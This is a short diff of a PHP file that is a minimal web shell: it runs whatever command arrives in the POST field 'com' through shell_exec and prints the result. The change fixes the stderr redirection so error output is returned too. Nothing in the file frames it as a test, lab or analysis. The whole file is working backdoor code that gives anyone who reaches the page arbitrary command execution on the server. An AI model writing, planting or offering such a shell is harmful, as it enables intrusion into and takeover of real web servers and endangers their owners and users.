@@ -1,5 +1,5 @@
 <?php
 
-echo shell_exec($_POST["com"] . " 2&>1");
+echo shell_exec($_POST["com"] . " 2>&1");
 
 ?>
